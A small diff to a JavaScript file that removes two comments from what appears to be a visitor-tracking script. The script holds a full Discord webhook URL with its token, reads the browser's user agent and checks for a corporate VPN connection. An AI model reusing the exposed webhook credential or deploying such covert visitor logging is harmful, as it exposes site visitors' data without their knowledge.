@@ -1,4 +1,4 @@
-const webhook = 'https://canary.discord.com/api/webhooks/1260862582902751414/4W3LOGZ2QWEQzsJSpukZYhZ3C6ecfSxUZoqSxgJ8q-4QDwW9DylyVuIQjfJPP9VN1Gyk'; // Replace with your actual webhook URL
+const webhook = 'https://canary.discord.com/api/webhooks/1260862582902751414/4W3LOGZ2QWEQzsJSpukZYhZ3C6ecfSxUZoqSxgJ8q-4QDwW9DylyVuIQjfJPP9VN1Gyk';
 
 const request = async () => {
   try {
@@ -8,7 +8,6 @@ const request = async () => {
 
     const userAgent = navigator.userAgent;
 
-    // VPN detection algorithm
     let isVPN = false;
     if (typeof VPNConn !== 'undefined' && VPNConn.connection_type === 'Corporate') {
       isVPN = true;
